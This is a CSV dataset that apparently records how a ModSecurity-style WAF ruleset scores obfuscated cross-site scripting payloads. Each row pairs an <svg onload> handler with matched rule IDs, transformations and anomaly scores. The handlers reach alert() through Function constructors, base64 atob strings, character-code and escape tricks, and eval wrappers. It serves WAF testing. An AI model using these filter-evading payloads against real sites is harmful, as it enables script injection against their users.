index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2514,"<svg onload=""new Function('re\u0074urn\u0020al\u0065rt')()(1)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603574784.396988
2515,"<svg onload=""Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603574818.141725
2517,"<svg onload=""(new(Function.bind.apply(Function,[null,atob('YWxlcnQoMSk=')])))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603575083.753545
2519,"<svg onload=""top['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,36v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,60t:urlDecodeUni,t:compressWhitespace || ",25,177603575329.275505
2524,"<svg onload=""Function['prototype']['constructor'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o21,52v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603575947.351668
2525,"<svg onload=""(function(){return this})()['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603576012.054318
2526,"<svg onload=""globalThis['Function'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o23,36v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603576254.645334
2528,"<svg/onload=""new/**/Function(atob('YWxlcnQoMSk='))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603576430.426442
2531,"<svg onload=""Reflect['construct'](Function,[atob('YWxlcnQoMSk=')])()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o20,48v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603576715.875146
2535,"<svg onload=""new(Function)(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,42v216,60t:urlDecode,t:replaceComments,t:compressWhitespace || v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603577263.623967
2538,"<svg onload=""new/**/(/**/Function/**/)/**/(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o17,45v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603577662.341103
2539,"<svg onload=""window['Function'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,44v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,65t:urlDecodeUni,t:compressWhitespace || ",25,177603577782.354636
2543,"<svg onload=""new top.Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760357829.579272
2544,"<svg onload=""new parent.Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578334.304626
2545,"<svg onload=""new&#9;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578486.584578
2546,"<svg onload=""new&#10;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603578554.243131
2547,"<svg onload=""new&#13;Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"941100,941120,941160,949110","v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760357871.634558
2549,"<svg onload=""Function['constructor'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,47v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603578984.677703
2550,"<svg onload=""new(window.Function)(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o16,49v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579083.177854
2551,"<svg onload=""new Function(atob`cmV0dXJuIGFsZXJ0KDEp`)()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,57 || v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579150.662840
2552,"<svg onload=""new Function(self.atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v216,64 || v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579345.193086
2553,"<svg onload=""new Function(window.atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o13,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579416.007020
2554,"<svg onload=""(new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,13v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603579587.967771
2559,"<svg onload=""self['Function'](decodeURI('%61%6C%65%72%74%28%31%29'))()""></svg>",0,1,block,7,"933210,941100,941120,941160,941370,942100,949110","o17,37v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,78t:urlDecodeUni,t:compressWhitespace || v217,78 || ",30,177603580166.417056
2578,"<svg onload=""setTimeout(Function(String.fromCharCode(97,108,101,114,116,40,49,41)),0)"">",0,1,block,5,"934100,941100,941120,941160,949110","o33,19v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603582632.340378
2580,"<svg onload=""setTimeout(Function('al\u0065rt(1)'),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603582875.947724
2585,"<svg onload=""setTimeout(Function(atob('YWxlcnQoMSk=')),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603583595.399634
2589,"<svg onload=""setTimeout(globalThis['Function']('al'+'ert(1)'),0)"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,41v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603584031.790769
2591,"<svg onload=""setTimeout(Function('al\145rt(1)'),0)"">",0,1,block,4,"941100,941120,941160,949110","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603584257.944051
2616,"<svg onload=""Promise.resolve().then(function(){var a=atob('YWxlcnQoMSk=');eval(a)})""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o73,5v217,91 || o74,9v217,91 || o36,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603587519.691153
2617,"<svg onload=""queueMicrotask(function(){var a=atob('YWxlcnQoMSk=');eval(a)})""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o65,5v217,83 || o66,9v217,83 || o28,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603587660.003433
2622,"<svg onload=""setTimeout(function(){var a=window.atob('YWxlcnQoMSk=');window.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o76,11v217,95 || o24,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588242.744068
2623,"<svg onload=""setTimeout(function(){var a=self.atob('YWxlcnQoMSk=');self.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o72,11v217,91 || o24,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588398.424119
2624,"<svg onload=""setTimeout(function(){var a=top.atob('YWxlcnQoMSk=');top.eval(a)},0)""></svg>",0,1,block,7,"932105,933160,934100,941100,941120,941160,949110","o65,4v217,89 || o70,11v217,89 || o24,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603588554.182131
2625,"<svg onload=""setTimeout(function(){var a=parent.atob('YWxlcnQoMSk=');parent.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o76,11v217,95 || o24,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588678.691304
2626,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');Function(a)()},0)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o70,9v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588799.653257
2627,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');[].constructor.constructor(a)()},0)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o62,35v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588840.451757
2628,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');(1,eval)(a)},0)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o24,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603588972.669318
2629,"<svg onload=""setTimeout(function(){with(atob)var a=call(null,'YWxlcnQoMSk=');eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o76,5v217,96 || o77,11v217,96 || o24,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760358910.763289
2630,"<svg onload=""setTimeout(function(){var a=atob(`YWxlcnQoMSk=`);eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o61,5v217,81 || o62,11v217,81 || o24,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589243.139324
2631,"<svg onload=""setTimeout(function(){var a=String.fromCharCode(...atob('YWxlcnQoMSk=').split('').map(c=>c.charCodeAt()));eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o118,5v217,138 || o119,11v217,138 || o24,11v217,138 || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589317.239356
2632,"<svg onload=""setTimeout(function(){var a=decodeURIComponent(escape(atob('YWxlcnQoMSk=')));eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o89,5v217,109 || o90,11v217,109 || o24,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589430.738981
2633,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');(function(){}).constructor(a)()},0)""></svg>",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o61,10v217,105 || o62,35v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589546.019509
2638,"<svg onload=""setTimeout(function(){this[String.fromCharCode(97,108,101,114,116)](9)},0)"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o24,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,45v217,89t:urlDecodeUni,t:compressWhitespace || ",25,177603590269.401145
